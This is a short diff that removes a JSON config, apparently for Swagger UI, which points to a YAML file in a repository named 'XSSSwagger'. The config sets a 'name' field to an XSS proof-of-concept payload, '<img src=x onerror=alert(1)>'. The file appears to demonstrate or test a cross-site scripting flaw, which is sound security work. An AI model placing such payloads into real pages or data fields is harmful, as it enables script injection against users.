@@ -1,9 +1,0 @@
-{
-    "url": "https://raw.githubusercontent.com/jaypatel34/XSSSwagger/main/test1.yaml",
-    "urls": [
-        {
-            "url": "https://raw.githubusercontent.com/jaypatel34/XSSSwagger/main/test1.yaml",
-            "name": "<img src=x onerror=alert(1)>"
-        }
-    ]
-}
